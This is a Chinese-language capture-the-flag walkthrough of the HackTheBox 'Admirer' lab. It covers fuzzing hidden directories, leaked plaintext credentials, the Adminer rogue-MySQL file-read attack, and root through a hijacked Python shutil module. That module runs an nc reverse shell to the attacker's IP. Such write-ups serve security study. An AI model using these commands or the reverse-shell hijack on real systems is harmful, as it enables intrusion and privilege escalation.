# Admirer\_187

![image-20200917084421893](assets/Admirer_187.assets/image-20200917084130111.png)

![image-20200625084030913](assets/Admirer_187.assets/image-20200625084030913.png)

![image-20200625084240993](assets/Admirer_187.assets/image-20200625084240993.png)

![image-20200625084655678](assets/Admirer_187.assets/image-20200625084655678.png)

目录扫描

![image-20200625101157700](assets/Admirer_187.assets/image-2.png)

![image-20200625084754631](assets/Admirer_187.assets/image-20200625084754631.png)

![image-20200625084849798](assets/Admirer_187.assets/image-20200625084849798.png)

应该是一个目录，我们可以直接FUZZ目录，看看有什么文件

由于我们不知道是什么文件类型，可以采用wfuzz的fuz2z参数，类似

![image-20200625094811499](assets/Admirer_187.assets/image-20200625094811499.png)

构建语句

```bash
wfuzz -w /usr/share/seclists/Discovery/Web-Content/big.txt -z list,txt-php-html -u http://10.10.10.187/admin-dir/FUZZ.FUZ2Z --hc 404,403 -t 100
```

![image-20200625095521738](assets/Admirer_187.assets/image-20200625095521738.png)

```bash
contacts.txt
credentials.txt
```

![image-20200625095718888](assets/Admirer_187.assets/image-20200625095718888.png)

```bash
contacts.txt

##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb

##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb

#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

![image-20200625095855008](assets/Admirer_187.assets/image-20200625095855008.png)

```bash
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

有ftp凭证，先查看ftp

![image-20200625100047290](assets/Admirer_187.assets/image-20200625100047290.png)

存在两个文件，全部下载

![image-20200625100734598](assets/Admirer_187.assets/image-20200625100734598.png)

dump.sql没有发现什么有用信息。

压缩包内容则看起来是网站的源码

![image-20200625101049374](assets/Admirer_187.assets/image-20200625101049374.png)

逐个文件查看，index.php中存在数据库凭证

![image-20200625123056044](assets/Admirer_187.assets/image-20200625123056044.png)

```bash
waldo:]F7jLHw:*G>UPrTo}~A"d6b
```

多出两个之前没有扫到的目录。

/w4ld0s\_s3cr3t\_d1r目录下就是之前发现的/admin-dir

/utility-scripts

![image-20200625101428926](assets/Admirer_187.assets/image-20200625101428926.png)

![image-20200625102118712](assets/Admirer_187.assets/image-20200625102118712.png)

![image-20200625102132417](assets/Admirer_187.assets/image-20200625102132417.png)

db\_admin.php中得到数据库凭证

![image-20200625101748736](assets/Admirer_187.assets/image-20200625101748736.png)

```bash
waldo:Wh3r3_1s_w4ld0?
```

尝试ssh密码复用失败

![image-20200625101940933](assets/Admirer_187.assets/image-20200625101940933.png)

参考到db\_admin.php中存在最后一行注释。`完成实施或找到更好的开源替代方案`

![image-20200625102352383](assets/Admirer_187.assets/image-20200625102352383.png)

在新目录下重新FUZZ

```bash
wfuzz -w /usr/share/seclists/Discovery/Web-Content/big.txt -z list,txt-php-html -u http://10.10.10.187/utility-scripts/FUZZ.FUZ2Z --hc 404,403 -t 100
```

![image-20200625103715232](assets/Admirer_187.assets/image-20200625103715232.png)

两个新页面

```bash
http://10.10.10.187/utility-scripts/adminer.php
http://10.10.10.187/utility-scripts/hq.php
```

![image-20200625103946023](assets/Admirer_187.assets/image-20200625103946023.png)

![image-20200625104018445](assets/Admirer_187.assets/image-20200625104018445.png)

先前的凭证无法复用,index.php中发现的数据库凭证也无法登录，估计是在网站备份有用户更新了凭证，尝试搜集更多漏洞信息

```bash
adminer 4.6.2 exploit
```

[https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)

> 攻击者将访问受害者的Adminer实例，但他们没有尝试连接到 受害者的MySQL数据库，而是“反向”连接到托管在自己服务器上的MySQL数据库。
>
> 其次，使用受害者的管理员（连接到他们自己的数据库）–他们使用MySQL命令 “ LOAD DATA LOCAL”，在受害者的服务器上指定本地文件。此命令用于将数据 从Adminer实例本地文件加载到数据库中。

可见，我们可以在kali本地假设数据库，然后用网站远程登录kali数据库，利用漏洞读取各种配置文件，或者读取index.php文件中最新的凭证继续尝试ssh密码复用。

首先在kali本地启动mysql服务

```bash
sudo service mysql start
```

使用root凭证登录mysql

```bash
sudo mysql -h localhost -u root -p
```

![image-20200625105634606](assets/Admirer_187.assets/image-20200625105634606.png)

```bash
CREATE DATABASE admirer;    #新建adminer对应数据库
CREATE USER 'evil'@'%' IDENTIFIED BY 'x';    #新建可以远程登录的用户evil
GRANT ALL PRIVILEGES ON * . * TO 'evil'@'%';
FLUSH PRIVILEGES;    #刷新权限
USE admirer;    #选择之前创建的数据库
CREATE TABLE evil(data VARCHAR(255));    #新建新表evil
EXIT;    #退出
```

编辑mysql配置文件，用来允许远程链接

```bash
sudo vim /etc/mysql/mariadb.conf.d/50-server.cnf
```

![image-20200625111832964](assets/Admirer_187.assets/image-20200625111832964.png)

重启mysql服务

```bash
sudo service mysql restart
```

用户evil，密码x，数据库admirer，尝试登录

![image-20200625121542890](assets/Admirer_187.assets/image-20200625121542890.png)

成功，点击SQL command

![image-20200625121804674](assets/Admirer_187.assets/image-20200625121804674.png)

按照漏洞利用的方法尝试读取其他位置的文件都无法完成，只能读取网页服务文件夹下的内容，按照之前的想法，读取index.php，查看用户更新后的数据库凭证

```bash
load data local infile '../index.php'        #因为index.ph在当前页面的上一层，所以要加../
into table evil
fields terminated by "/n"
```

![image-20200625123602431](assets/Admirer_187.assets/image-20200625123602431.png)

执行成功，点击左侧操作面板的select，查看存入表单的信息

![image-20200625124018980](assets/Admirer_187.assets/image-20200625124018980.png)

得到新的凭证

![image-20200625124106205](assets/Admirer_187.assets/image-20200625124106205.png)

```bash
waldo:&<h5b~yK3F#{PaPB&dA}{H>
```

再次使用新凭证尝试ssh密码复用

![image-20200625113249400](assets/Admirer_187.assets/image-20200625113249400.png)

![image-20200625113510475](assets/Admirer_187.assets/image-20200625113510475.png)

查看脚本权限

![image-20200625113654781](assets/Admirer_187.assets/image-20200625113654781.png)

不能修改，查看脚本内容

```bash
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
```

调用了另外一个脚本/opt/scripts/backup.py

查看

```bash
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

脚本同样不能修改，但是python调用了模块，我们可以尝试利用python库劫持的方法。

```bash
mkdir /tmp/evillib
cd /tmp/evillib
vi shutil.py
```

![image-20200625115912024](assets/Admirer_187.assets/image-20200625115912024.png)

```bash
import os
def make_archive(x,y,z):
    os.system("nc 10.10.14.189 1337 -e '/bin/sh'")
```

![image-20200625115759277](assets/Admirer_187.assets/image-20200625115759277.png)

在kali端口1337建立监听，并执行

```bash
sudo PYTHONPATH=/tmp/evillib /opt/scripts/admin_tasks.sh
```

![image-20200625120405933](assets/Admirer_187.assets/image-20200625120405933.png)

![image-20200625120437990](assets/Admirer_187.assets/image-20200625120437990.png)

